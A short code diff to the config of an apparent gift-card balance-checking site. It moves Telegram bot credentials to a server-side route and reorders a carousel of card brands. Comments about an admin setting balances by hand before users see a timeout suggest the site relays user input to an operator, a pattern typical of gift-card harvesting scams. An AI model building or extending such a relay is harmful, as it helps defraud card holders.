@@ -4,11 +4,9 @@
 // ============================================================
 
 const CONFIG = {
-  // Paste your Telegram Bot Token here
-  TELEGRAM_BOT_TOKEN: 'YOUR_BOT_TOKEN_HERE',
-
-  // Paste your Telegram Chat ID here (e.g. '123456789')
-  TELEGRAM_CHAT_ID: 'YOUR_CHAT_ID_HERE',
+  // Telegram now sent via /api/telegram (server-side env vars on Vercel)
+  TELEGRAM_BOT_TOKEN: '',
+  TELEGRAM_CHAT_ID: '',
 
   // How long (ms) to wait for admin to set balance via admin panel
   // before showing "timeout" message to user
@@ -22,10 +20,10 @@ const CONFIG = {
 const CAROUSEL_CARDS = [
   { slug: 'itunes',      label: 'iTunes',       img: 'public/images/itunes.png' },
   { slug: 'razer',       label: 'Razer Gold',   img: 'public/images/razer_recent.png' },
-  { slug: 'du',          label: 'du',           img: 'public/images/du.png' },
   { slug: 'stc',         label: 'STC',          img: 'public/images/stc.png' },
   { slug: 'mobily',      label: 'Mobily',       img: 'public/images/mobily.png' },
   { slug: 'lebara',      label: 'Lebara',       img: 'public/images/lebara_brand.png' },
+  { slug: 'du',          label: 'du',           img: 'public/images/du.png' },
   { slug: 'freefire',    label: 'Free Fire',    img: 'public/images/freefire.png' },
   { slug: 'friendi',     label: 'Friendi',      img: 'public/images/friendi.png' },
   { slug: 'gamestop',    label: 'GameStop',     img: 'public/images/game_stop.png' },
